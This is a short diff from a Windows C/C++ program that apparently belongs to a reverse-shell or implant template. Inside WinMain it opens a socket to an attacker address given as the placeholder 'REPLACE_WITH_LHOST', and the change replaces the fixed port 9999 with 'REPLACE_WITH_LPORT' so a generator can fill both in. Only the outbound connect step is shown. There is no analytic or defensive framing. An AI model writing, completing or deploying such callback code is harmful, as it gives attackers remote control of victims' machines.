@@ -28,7 +28,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr("REPLACE_WITH_LHOST");
-    server.sin_port = htons(9999);  // Change to your desired port
+    server.sin_port = htons(REPLACE_WITH_LPORT);  // Change to your desired port
 
     if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
         closesocket(sock);
